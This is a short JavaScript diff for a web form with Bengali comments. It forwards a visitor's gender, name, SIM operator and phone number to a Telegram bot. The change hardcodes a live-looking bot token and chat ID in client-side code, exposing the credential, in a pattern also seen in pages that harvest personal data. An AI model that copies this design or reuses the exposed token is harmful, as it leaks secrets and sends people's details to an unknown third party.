@@ -13,8 +13,8 @@ document.getElementById("submitForm").addEventListener("submit", function(event)
 
     let message = `😋 লিঙ্গ : ${gender}\n💥নাম : ${name}\n💬সিম : ${sim}\n👌নাম্বার : ${number}`;
     
-    let botToken = "YOUR_BOT_TOKEN";  // 🔥 এখানে আপনার Bot Token দিন
-    let chatId = "YOUR_CHAT_ID";  // 🔥 এখানে আপনার Chat ID দিন
+    let botToken = "7997811733:AAEgcdq3mGC64cB_duEsQ2kfHTq6CG6t4Ec";  // 🔥 এখানে আপনার Bot Token দিন
+    let chatId = "7294674899";  // 🔥 এখানে আপনার Chat ID দিন
 
     let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
